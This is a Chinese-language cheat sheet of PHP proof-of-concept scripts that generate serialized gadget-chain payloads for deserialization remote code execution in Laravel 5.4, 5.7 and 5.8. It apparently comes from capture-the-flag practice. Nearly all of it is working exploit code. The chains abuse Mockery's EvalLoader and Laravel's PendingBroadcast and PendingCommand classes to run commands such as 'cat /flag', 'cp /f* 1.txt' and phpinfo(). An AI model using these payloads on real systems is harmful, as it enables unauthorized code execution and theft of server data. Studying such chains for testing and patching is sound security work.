## **Laravel5.4反序列化**
如果生产payload罕有`/`，需要进行url编码，这里需要进行两次编码`%252f`
```
<?php
namespace Mockery\Generator {
    class MockConfiguration {
        protected $name = 'fallingskies';
    }
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct() {
            $this->config = new MockConfiguration();
            $this->code = "<?php system('cat /flag');?>";
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition();
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```


## **Laravel5.7反序列化**
```
<?php

namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        public $test;
        protected $app;
        protected $command;
        protected $parameters;

        public function __construct($test, $app, $command, $parameters)
        {
            $this->test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser
            $this->app = $app;                   //一个实例化的类 Illuminate\Foundation\Application
            $this->command = $command;           //要执行的php函数 system
            $this->parameters = $parameters;     //要执行的php函数的参数  array('id')
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace Illuminate\Foundation {
    class Application
    {
        protected $instances = [];

        public function __construct($instances = [])
        {
            $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {
    $defaultgenerator = new Faker\DefaultGenerator(array("hello" => "world"));

    $app = new Illuminate\Foundation\Application();

    $application = new Illuminate\Foundation\Application($app);

    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, 'system', array('cp /f* 1.txt')); //此处执行命令

    echo urlencode(serialize($pendingcommand));
}
```

^
## **Laravel5.8反序列化**
```
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{

    use Mockery\Generator\MockDefinition;

    class QueuedCommand
    {
        public $connection;
        public function __construct(){
            $this->connection=new MockDefinition();
        }
    }
}
namespace Illuminate\Bus{

    use Mockery\Loader\EvalLoader;

    class Dispatcher
    {
        protected $queueResolver;
        public function __construct(){
            $this->queueResolver=[new EvalLoader(),'load'];
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader
    {

    }
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;
        public function __construct()
        {
            $this->code="<?php phpinfo();exit()?>"; //此处是PHP代码
            $this->config=new MockConfiguration();
        }
    }
    class MockConfiguration
    {
        protected $name="feng";
    }
}

namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}
```